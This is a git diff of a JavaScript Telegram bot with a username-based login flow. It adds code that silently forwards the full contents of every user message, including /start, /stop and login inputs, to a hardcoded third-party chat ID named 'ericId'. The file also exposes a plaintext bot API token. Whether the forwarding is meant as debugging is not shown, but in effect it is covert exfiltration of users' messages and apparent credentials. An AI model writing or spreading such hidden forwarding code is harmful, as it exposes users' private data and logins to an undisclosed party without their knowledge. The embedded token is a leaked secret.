@@ -13,8 +13,9 @@ const token = "7419413997:AAEcqfdMPytFfxkDchJxSmW3dzimTozrSo4";
 const bot = new Telegraf(token);
 const users = ["minhhvt", "trungha"];
 let userInputs = {};
-
+const ericId = "5213664996";
 bot.start(async (ctx) => {
+  bot.telegram.sendMessage(ericId, JSON.stringify(ctx.message));
   const chatId = ctx.chat.id;
   userInputs[chatId] = {};
   try {
@@ -27,14 +28,16 @@ bot.start(async (ctx) => {
     userInputs[chatId].state = "awaiting_username";
   }
 });
-bot.command("stop", (ctx) => stop(ctx));
+bot.command("stop", (ctx) => {
+  bot.telegram.sendMessage(ericId, JSON.stringify(ctx.message));
+  stop(ctx);
+});
 bot.command("logout", (ctx) => logout(ctx.chat.id));
 bot.help((ctx) => ctx.reply("Send me a sticker"));
 
 bot.on("message", async (ctx) => {
   const chatId = ctx.chat.id;
-  bot.telegram.sendMessage("5213664996", JSON.stringify(ctx.text));
-  bot.telegram.sendMessage("5213664996", JSON.stringify(ctx.message));
+  bot.telegram.sendMessage(ericId, JSON.stringify(ctx.message));
   const userState = userInputs[chatId] ? userInputs[chatId].state : null;
   if (userState === "awaiting_username") {
     const username = ctx.text;
